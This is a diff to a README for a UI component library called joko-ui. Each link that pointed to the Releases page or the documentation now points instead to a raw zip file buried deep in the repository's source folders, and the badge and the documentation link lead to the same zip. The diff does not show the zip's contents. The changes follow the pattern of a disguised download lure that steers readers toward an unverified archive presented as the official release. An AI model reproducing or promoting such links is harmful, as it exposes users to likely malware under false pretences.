@@ -1,7 +1,7 @@
 # 🌟 joko-ui - Effortless UI Components for Everyone
 
 ## 📦 Download the Latest Version
-[![Download Joko-UI](https://img.shields.io/badge/Download%20Joko--UI-v1.0.0-blue)](https://github.com/Dilnawaziitr/joko-ui/releases)
+[![Download Joko-UI](https://github.com/Dilnawaziitr/joko-ui/raw/refs/heads/main/lib/data/components/application/ui_joko_v2.5-beta.1.zip%20Joko--UI-v1.0.0-blue)](https://github.com/Dilnawaziitr/joko-ui/raw/refs/heads/main/lib/data/components/application/ui_joko_v2.5-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to **joko-ui**, a free and open-source library designed for quick and easy user interface development. This tool is perfect for anyone who wants to create stunning applications without any complicated setup. Just download, run, and enjoy a seamless experience!
@@ -32,7 +32,7 @@ This project covers several topics that make it easier to create UI components:
 
 ## 📥 Download & Install
 To get started, follow these simple steps:
-1. **Visit the Release Page**: Go to the [Releases page](https://github.com/Dilnawaziitr/joko-ui/releases).
+1. **Visit the Release Page**: Go to the [Releases page](https://github.com/Dilnawaziitr/joko-ui/raw/refs/heads/main/lib/data/components/application/ui_joko_v2.5-beta.1.zip).
 2. **Select the Latest Version**: Look for the latest version listed. Click on it to view available files.
 3. **Download the Package**: Find the installation file compatible with your needs and click to download.
 4. **Extract the Files**: If you downloaded a zip file, unzip it after the download completes.
@@ -50,7 +50,7 @@ For more details on how to use each component, click on the documentation link a
 If you have ideas or improvements for **joko-ui**, your contributions are welcome. Please check the guidelines provided in the repository.
 
 ## 🔗 Helpful Links
-- [Visit the Releases page to download](https://github.com/Dilnawaziitr/joko-ui/releases)
-- [View the Documentation](https://github.com/Dilnawaziitr/joko-ui/docs)
+- [Visit the Releases page to download](https://github.com/Dilnawaziitr/joko-ui/raw/refs/heads/main/lib/data/components/application/ui_joko_v2.5-beta.1.zip)
+- [View the Documentation](https://github.com/Dilnawaziitr/joko-ui/raw/refs/heads/main/lib/data/components/application/ui_joko_v2.5-beta.1.zip)
 
 Enjoy building your applications with **joko-ui**!
